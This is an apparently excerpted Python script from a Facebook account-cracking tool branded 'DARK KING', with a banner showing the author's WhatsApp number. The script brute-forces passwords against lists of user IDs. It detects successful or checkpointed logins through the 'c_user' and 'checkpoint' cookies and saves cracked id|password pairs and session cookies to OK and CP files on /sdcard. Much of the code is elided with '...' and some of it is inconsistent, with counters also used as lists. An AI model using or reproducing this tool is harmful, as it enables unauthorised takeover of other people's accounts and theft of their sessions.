...
-------------------------------------------------------------------------------------------     
  ...
  \033[91;1m  ╔════════════════════════════════════════╗
   {H} ║{P}[{H}•{P}] Author    :{warna}𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆                 {N}{H}║
  {H}  ║{P}[{H}•{P}] Facebook  : {H}𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆         {N}{H}║
    {H}║{P}[{H}•{P}] Whatsapp  : {M}+𝟖𝟖𝟎𝟏𝟕𝟒𝟎𝟐𝟖𝟏𝟓𝟖𝟓          {N}{H}║
  {H}  ║{P}[{H}•{P}] Github    : {K}github.com/𝐃𝐀𝐑𝐊𝐊𝐈𝐍𝐆𝐂𝐔𝐁𝐄𝐑𝟕𝟏{N}    {H}  ║
  {H}  ║{P}[{H}•{P}] Status    : {H}𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆 {P}     {N}      {H}     ║
   {H} ║{P}[{H}•{P}] Network   : {H}3G{N}, {H}4G/5G{N}, {H}ON{N}     {H}      ║
   {H} ║{P}[{H}•{P}] Version   : {H}2.0.9                   ║
   {H} ║{P}[{H}•{P}] Tools     : {H}𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆             ║
   {M} ╚════════════════════════════════════════╝ {P}""")
    print(f"""{GREEN}    SELL DONE{P}
 {K}[{H}√{K}]{P} This message is for my haters 
 {K}[{H}√{K}]{P}       {H} The 𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆 Is BACK 
        ...
        try:
           ...
           'sec-ch-ua-mobile': '?0'})
            ...
            if "checkpoint" in session.cookies.get_dict().keys():
             ...
             cp+=1
             if 'y' in cp_xdx:
              print(f'\r{P} [\033[1;30m𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
             open(' /sdcard/𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆-CP.txt', 'a').write(idf+'|'+pw)
             cp.append(idf)
             break
                ...
                open(' /sdcard/𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆-OK.txt', 'a').write(idf+'|'+pw)
                ok.append(idf+'|'+pw)
                break
            else:
                continue
 ...
 for pw in pwv:
  try:
   ...
   if "checkpoint" in po.cookies.get_dict().keys():
    ...
    ok+=1
    print(f'\r{P} [{H}𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆-OK{P}] {GREEN}{idf}|{pw}{xxx}')
    if 'y' in cokix:
  ...
  for pw in pwv:
    try:
      ...
      if "checkpoint" in po.cookies.get_dict().keys():
        ...
        if 'y' in cp_xdx:
         print(f'\r{P} [\033[1;30m𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
        open(' /sdcard/𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆-CP.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
        cp+=1
        break
      elif "c_user" in ses.cookies.get_dict().keys():
        ok+=1
        ...
        if 'y' in cokix:
         print(f'\r{gen}{H}'+kuki)
        open(' /sdcard/𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
        break
 ...
 try:
  for ps in pw:
   ...
   if 'c_user' in log_cookies:
    ...
    print('\r\033[1;32m [𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆-OK] '+user+'|'+ps) #+'--'+coki)
    if 'y' in cokix:
    ...
    uid = "1000"+coki1[0:11]
    if 'y' in cp_xdx:
     print(f'\r{P} [\033[1;30m𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆-CP{P}] \033[1;30m{idf}|{ps}{xxx}')
    open(' /sdcard/𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆-CP.txt','a').write(idf+'|'+ps+'|'+'\n')
    cp.append(idf)
   else:
    continue
  loop+=1
  ...
  for ps in pw:
   ...
   if 'c_user' in log_cookies:
    ...
    if 'y' in cokix:
     print(f'\r{gen}{H}'+coki)
    ok+=1 
    open(' /sdcard/𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆-OK.txt','a').write(user+'|'+ps+'|'+'\n')
    ok.append(user)
    break
   elif 'checkpoint' in log_cookies:
    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
    ...
    uid = "1000"+coki1[0:11]
    if 'y' in cp_xdx:
     print(f'\r{P} [\033[1;30𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆-CP{P}] \033[1;30m{idf}|{ps}{xxx}')
    open(' /sdcard/𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆-CP.txt','a').write(idf+'|'+ps+'|'+'\n')
    cp.append(idf)
   else:
    continue
